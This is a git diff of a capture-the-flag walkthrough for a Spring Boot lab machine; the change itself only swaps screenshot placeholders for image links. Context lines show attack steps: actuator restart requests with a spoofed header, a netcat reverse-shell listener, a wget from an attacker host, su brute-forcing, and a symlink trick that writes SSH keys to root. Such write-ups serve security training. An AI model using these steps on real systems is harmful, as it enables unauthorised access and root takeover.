@@ -14,7 +14,7 @@
 nmap <TARGET_IP>
 ```
 
-[SCREEN01]
+<img width="531" height="203" alt="SCREEN01" src="https://github.com/user-attachments/assets/ddae49df-1317-40a3-96be-bec2f08a7953" />
 
 2. Use gobuster to enumerate directories and discover hidden paths. This scan will reveal a `/sources/new/.git/` directory.
 
@@ -36,7 +36,7 @@ git log
 
 The author is `johnsmith@spring.thm`
 
-[SCREEN02]
+<img width="531" height="237" alt="SCREEN02" src="https://github.com/user-attachments/assets/cd2e8a9f-1e91-4f8e-95e5-b6af35e32705" />
 
 5. Reset to a commit that appears to contain useful configuration.
 
@@ -94,7 +94,7 @@ curl -k -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 17
 curl -k -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.0' "https://<TARGET_IP>/actuator/restart"
 ```
 
-[SCREEN03]
+<img width="622" height="84" alt="SCREEN03" src="https://github.com/user-attachments/assets/9215b51d-6613-4f09-a7c9-57f2123b806a" />
 
 13. Set up a netcat listener to catch the incoming reverse shell connection.
 
@@ -120,7 +120,7 @@ curl -k -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 17
 cat /opt/foothold.txt
 ```
 
-[SCREEN04]
+<img width="314" height="48" alt="SCREEN04" src="https://github.com/user-attachments/assets/7068ffa9-0696-47bd-b14e-ee6e75550d54" />
 
 ---
 
@@ -194,7 +194,7 @@ wget <ATTACKER_IP>/capitalized_words.txt
 time bash su_brute_force.sh capitalized_words.txt
 ```
 
-[SCREEN05]
+<img width="564" height="99" alt="SCREN05" src="https://github.com/user-attachments/assets/ca251cc6-5971-4891-9bb5-884bb932a958" />
 
 5. Upgrade to a proper TTY shell and switch to the johnsmith user with the discovered credentials.
 
@@ -210,7 +210,7 @@ su johnsmith
 cat /home/johnsmith/user.txt
 ```
 
-[SCREEN06]
+<img width="344" height="128" alt="SCREEN06" src="https://github.com/user-attachments/assets/46335ca4-27d1-4ac8-bdea-de020f77054d" />
 
 ---
 
@@ -248,7 +248,7 @@ The key finding here is that the Spring Boot application runs as **root** and ha
 systemctl status spring
 ```
 
-[SCREEN07]
+<img width="649" height="207" alt="SCREEN07" src="https://github.com/user-attachments/assets/18d41bbc-660c-4716-a521-3adfc6d08266" />
 
 3. The privilege escalation vector exploits a race condition in the logging mechanism. When the Spring Boot application starts, it creates log files in a directory where johnsmith has write access (`/home/johnsmith/tomcatlogs`). By creating symbolic links with timestamps matching future log filenames and then causing the application to restart, we can write SSH public keys to root's authorized_keys file.
 
